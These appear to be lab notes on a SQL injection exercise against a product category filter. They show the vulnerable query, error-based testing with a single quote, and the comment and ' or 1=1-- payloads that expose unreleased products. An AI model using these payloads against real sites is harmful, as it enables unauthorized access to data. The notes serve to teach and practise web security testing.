SQL injection - product category filter

SELECT * FROM products WHERE category ='Gifts' and released=1

End goal: display all products both released and unreleased

Analysis:
First we need to check if the server is vulnerable to sql injection, We tested it using "'" character by replacing category='
We got internal server from server which means server is vulnerable because we got a response
We tested it further by commenting out rest of the payload
#SELECT * FROM products WHERE category =''--' and released=1, This time we got no error and page dispalyed '--
#SELECT * FROM products WHERE category ='' or 1=1--' and released=1 , here 1=1 always evaluates to true and we get output of all the categories
